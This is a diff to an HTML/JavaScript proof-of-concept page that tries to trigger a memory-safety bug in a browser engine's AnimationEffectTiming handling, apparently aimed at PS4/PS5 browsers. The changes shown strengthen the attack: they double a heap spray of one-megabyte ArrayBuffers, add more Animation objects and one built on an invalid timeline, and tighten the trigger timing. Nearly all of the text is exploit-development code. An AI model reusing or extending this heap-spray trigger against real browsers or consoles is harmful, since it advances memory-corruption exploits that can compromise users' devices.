@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AnimationEffectTiming ASAN PoC v2 (PS4/PS5?)</title>
+    <title>AnimationEffectTiming ASAN PoC v3 (PS4/PS5?)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -33,7 +33,7 @@
     </style>
 </head>
 <body>
-    <h1>AnimationEffectTiming ASAN PoC v2</h1>
+    <h1>AnimationEffectTiming ASAN PoC v3</h1>
     <p>Click to test ASAN issue in AnimationEffectTiming::getBasicTiming.</p>
     <button id="trigger">TEST ANIMATION</button>
     <div id="status">Idle...</div>
@@ -45,7 +45,7 @@
         let attemptCount = 0;
 
         function log(msg) {
-            consoleDiv.append(msg + '\n');
+            consoleDiv.append(`[${new Date().toISOString()}] ${msg}\n`);
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
         }
 
@@ -93,7 +93,7 @@
 
                 // Heap spray
                 const spray = [];
-                for (let i = 0; i < 1000; i++) {
+                for (let i = 0; i < 2000; i++) {
                     spray.push(new ArrayBuffer(1024 * 1024));
                 }
 
@@ -101,9 +101,16 @@
                 const target = document.getElementById('target');
                 const keyframes = { transform: ['translateX(0)', 'translateX(100px)'] };
                 const animations = [];
-                for (let i = 0; i < 10; i++) {
+                for (let i = 0; i < 20; i++) {
                     const effect = new KeyframeEffect(target, keyframes, { duration: 1000 });
                     animations.push(new Animation(effect, document.timeline));
+                }
+                // Add invalid timeline
+                try {
+                    const invalidTimeline = { currentTime: null };
+                    animations.push(new Animation(new KeyframeEffect(target, keyframes, { duration: 1000 }), invalidTimeline));
+                } catch (e) {
+                    log(`Invalid timeline error: ${e.message}`);
                 }
 
                 // Trigger animations
@@ -119,7 +126,7 @@
                     } catch (e) {
                         log(`Error in animation: ${e.message}`);
                     }
-                }, 5);
+                }, 2);
 
                 // Check for memory changes or crash
                 setTimeout(() => {
